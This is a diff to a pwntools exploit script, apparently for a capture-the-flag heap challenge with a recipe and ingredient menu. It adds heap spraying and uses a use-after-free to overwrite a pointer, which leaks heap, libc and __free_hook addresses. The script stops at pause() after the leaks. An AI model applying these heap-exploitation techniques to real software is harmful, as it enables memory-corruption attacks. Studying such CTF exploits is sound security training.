@@ -21,44 +21,45 @@ libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 context.arch = b.arch
 context.log_level = 'info'
 
-# use-after-free:
-# 
-# create a stale pointer
-# 
-# add new ingredients 
-#
-# overwrite a pointer
+def send(c):
+    r.sendline(c)
 
 def stou(i):
     return ctypes.c_uint32(i).value
 
+def fill_heap(n):
+    for i in xrange(0, n):
+        send("g")
+        send(hex(0x5))
+        send(str(i))
+
 def add_leak(addr):
-    r.sendline('c')
-    r.sendline('n')
-    r.sendline('g')
-    r.sendline('babo')
+    fill_heap(0x200)
 
-    r.sendline('d') # create a stale pointer
-    r.sendline('q')
+    send('c')
+    send('n')
+    send('g')
+    send('babo')
 
-    r.sendline('a') # add ingredient
-    r.sendline('n')
-    r.sendline('g')
-    r.sendline('AAAA1111')
-    r.sendline('e')
-    r.sendline('q')
+    send('d') # create a stale pointer (UaF)
+    send('q')
 
-    r.sendline('c')
-    r.sendline('g')
-    r.sendline('AAAABBBBCCCC' + p32(addr) + p32(0)) # overwrite a pointer
-    r.sendline('q')
+    send('a') # add ingredient
+    send('n')
+    send('g')
+    send('AAAA1111')
+    send('e')
+    send('q')
+
+    send('c')
+    send('g')
+    send('AAAABBBBCCCC' + p32(addr) + p32(0)) # overwrite a pointer
+    send('q')
     
 def parse_ingredient():
     r.clean()
-    r.sendline('l')
+    send('l')
     resp = r.recv()
-
-    print resp
 
     li = resp.split('------')
     last = li[-2]
@@ -69,17 +70,17 @@ def parse_ingredient():
 if __name__ == "__main__":
 
     r.recvuntil("what's your name?")
-    r.sendline('babo')
+    send('babo')
 
     # leak heap address
-    r.sendline('c')
+    send('c')
 
 # 'n' will alloc CURRENT_RECIPE structure (4 bytes + 4 bytes + ...)
-    r.sendline('n') # alloc 0x40c bytes (which is too big for fastbin)
-    r.sendline('a') # alloc two chunks (ingredient_ptr & howmany)
-    r.sendline('basil')
-    r.sendline('1')
-    r.sendline('d') # free()
+    send('n') # alloc 0x40c bytes (which is too big for fastbin)
+    send('a') # alloc two chunks (ingredient_ptr & howmany)
+    send('basil')
+    send('1')
+    send('d') # free()
 
 # free() overwrite the first two dwords with pointers in libc which point the last chunk
 
@@ -100,7 +101,7 @@ if __name__ == "__main__":
 # 'p' will leak the 0x0804f718
 
     r.clean()
-    r.sendline('p')
+    send('p')
     resp = r.recv()
     log.info("3th line: %s" % resp.split("\n")[3])
     LEAKED_HEAP_ADDR = int(resp.split("\n")[3].split("-")[0])
@@ -112,5 +113,11 @@ if __name__ == "__main__":
 
     LIBC = leaked - PRINTF_OFFSET
     log.info("LIBC: 0x%x" % LIBC)
+
+    FREE_HOOK_PTR = LIBC + FREE_HOOK_OFFSET
+    add_leak(FREE_HOOK_PTR)
+    FREE_HOOK = parse_ingredient()
+    log.info("FREE_HOOK_PTR: 0x%x" % FREE_HOOK_PTR)
+    log.info("FREE_HOOK: 0x%x" % FREE_HOOK)
 
     pause()
